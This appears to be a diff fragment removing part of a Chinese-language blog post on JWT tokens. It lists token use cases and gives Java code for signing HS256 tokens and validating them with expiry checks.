-</ul>
-
-<p><code>https://api.weixin.qq.com/cgi-bin/component/api_query_auth?component_access_token=xxxx</code></p>
-
-<ul>
-<li><p>支付验证（一次性）</p></li>
-<li><p>串行服务调用</p>
-<p>一次性有效，再次生成token时以用户账户和第一次token为key，update该记录来判断</p></li>
-<li><p>敏感接口多次调用</p></li>
-</ul>
-
-<h4 id="toc_4">0x05 代码</h4>
-
-<p><strong>生成代码</strong></p>
-
-<pre><code class="language-text">private static final JWSHeader header=new JWSHeader(JWSAlgorithm.HS256, JOSEObjectType.JWT, null, null, null, null, null, null, null, null, null, null, null);
-    
-    /**
-     * 生成token，该方法只在用户登录成功后调用
-     * 
-     * @param Map集合，可以存储用户id，token生成时间，token过期时间等自定义字段
-     * @return token字符串,若失败则返回null
-     */
-    public static String createToken(Map&lt;String, Object&gt; payload) {
-        String tokenString=null;
-        // 创建一个 JWS object
-        JWSObject jwsObject = new JWSObject(header, new Payload(new JSONObject(payload)));
-        try {
-            // 将jwsObject 进行HMAC签名
-            jwsObject.sign(new MACSigner(SECRET));
-            tokenString=jwsObject.serialize();
-        } catch (JOSEException e) {
-            System.err.println(&quot;签名失败:&quot; + e.getMessage());
-            e.printStackTrace();
-        }
-        return tokenString;
-    }
-</code></pre>
-
-<p><strong>校验代码</strong></p>
-
-<pre><code class="language-text">public static Map&lt;String, Object&gt; validToken(String token) {
-        Map&lt;String, Object&gt; resultMap = new HashMap&lt;String, Object&gt;();
-        try {
-            JWSObject jwsObject = JWSObject.parse(token);
-            Payload payload = jwsObject.getPayload();
-            JWSVerifier verifier = new MACVerifier(SECRET);
-            if (jwsObject.verify(verifier)) {
-                JSONObject jsonOBj = payload.toJSONObject();
-                // token校验成功（此时没有校验是否过期）
-                resultMap.put(&quot;state&quot;, TokenState.VALID.toString());
-                // 若payload包含ext字段，则校验是否过期
-                if (jsonOBj.containsKey(&quot;ext&quot;)) {
-                    long extTime = Long.valueOf(jsonOBj.get(&quot;ext&quot;).toString());
-                    long curTime = new Date().getTime();
-                    // 过期了
-                    if (curTime &gt; extTime) {
-                        resultMap.clear();
-                        resultMap.put(&quot;state&quot;, TokenState.EXPIRED.toString());
-                    }
-                }
-                resultMap.put(&quot;data&quot;, jsonOBj);
-            } else {
-                // 校验失败
-                resultMap.put(&quot;state&quot;, TokenState.INVALID.toString());
-            }
-        } catch (Exception e) {
-            //e.printStackTrace();
-            // token格式不合法导致的异常
-            resultMap.clear();
-            resultMap.put(&quot;state&quot;, TokenState.INVALID.toString());
-        }
-        return resultMap;
-    }   
-</code></pre>
-
-<p>参考：<br/>
-<a href="http://blog.leapoahead.com/2015/09/06/understanding-jwt/">http://blog.leapoahead.com/2015/09/06/understanding-jwt/</a><br/>
-<a href="https://github.com/bigmeow/JWT">https://github.com/bigmeow/JWT</a></p>
 
 ]]></content>
   </entry>
